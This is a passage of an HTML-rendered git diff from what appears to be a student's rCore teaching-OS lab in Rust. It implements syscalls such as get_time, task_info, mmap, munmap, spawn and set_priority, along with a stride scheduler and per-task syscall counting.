range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// remove a area</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some((idx, area)) = self</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d216861..8ff9c7b 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -11,9 +11,9 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix deleted">-</span><span class="token line">use address::&#123;StepByOne, VPNRange&#125;;</span><span class="token prefix deleted">-</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use address::StepByOne;</span><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use page_table::&#123;translated_byte_buffer, translated_refmut, translated_str, PageTableEntry&#125;;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 8e0a7dd..ba663a1 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -45,8 +45,11 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::current_task;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_READ => sys_read(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f7aa9c3..13b9abb 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,14 +1,16 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    loader::get_app_data_by_name,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;is_mem_sufficient, translated_byte_buffer, translated_refmut, translated_str, VirtAddr&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next,</span><span class="token prefix deleted">-</span><span class="token line">        suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: current_task().unwrap().get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: current_task().unwrap().get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(_len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().mmap(start_va, end_va, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().munmap(start_va, end_va)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span></span>@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: fork + exec =/= spawn</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_spawn(_path: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    // spawn a new process based upon _path</span><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _path = translated_str(token, _path);</span><span class="token prefix inserted">+</span><span class="token line">    let data_opt = get_app_data_by_name(_path.as_str());</span><span class="token prefix inserted">+</span><span class="token line">    if data_opt.is_none() &#123;  // invalid file name</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let new_task = current_task.spawn(data_opt.unwrap());</span><span class="token prefix inserted">+</span><span class="token line">    let new_pid = new_task.getpid();</span><span class="token prefix inserted">+</span><span class="token line">    add_task(new_task);</span><span class="token prefix inserted">+</span><span class="token line">    new_pid as isize</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Set task priority.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_set_priority(_prio: isize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if _prio &lt;= 1 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    current_task.set_prio(_prio);</span><span class="token prefix inserted">+</span><span class="token line">    _prio</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644<span class="token coord">--- a/os/src/task/manager.rs</span><span class="token coord">+++ b/os/src/task/manager.rs</span>@@ -19,11 +19,27 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Add process back to ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock>) &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        task.inc_stride();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.ready_queue.push_back(task);</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Take a process out of the ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn fetch(&amp;mut self) -> Option&lt;Arc&lt;TaskControlBlock>> &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        self.ready_queue.pop_front()</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        // self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        let mut min_stride = isize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        let mut best_idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let stride = tcb.get_stride();</span><span class="token prefix inserted">+</span><span class="token line">            if min_stride > stride &#123;</span><span class="token prefix inserted">+</span><span class="token line">                min_stride = stride;</span><span class="token prefix inserted">+</span><span class="token line">                best_idx = idx;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        if min_stride == isize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            None</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.swap(0, best_idx);</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644<span class="token coord">--- a/os/src/task/processor.rs</span><span class="token coord">+++ b/os/src/task/processor.rs</span>@@ -8,6 +8,7 @@ use super::__switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;fetch_task, TaskStatus&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;TaskContext, TaskControlBlock&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            task_inner.task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if task_inner.time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            // release coming task_inner manually</span><span class="token prefix unchanged"> </span><span class="token line">            drop(task_inner);</span><span class="token prefix unchanged"> </span><span class="token line">            // release coming task TCB manually</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 1402c31..e60021d 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,9 +1,10 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management &amp; Functions for completely changing TCB</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span><span class="token prefix deleted">-</span><span class="token line">use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::&#123;trap_handler, TrapContext&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span></span>@@ -34,6 +35,86 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">        inner.memory_set.token()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Set the schduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.set_prio(prio);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get the schduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_stride(&amp;self) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.stride</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase the stride by pass</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.inc_stride();</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">pub 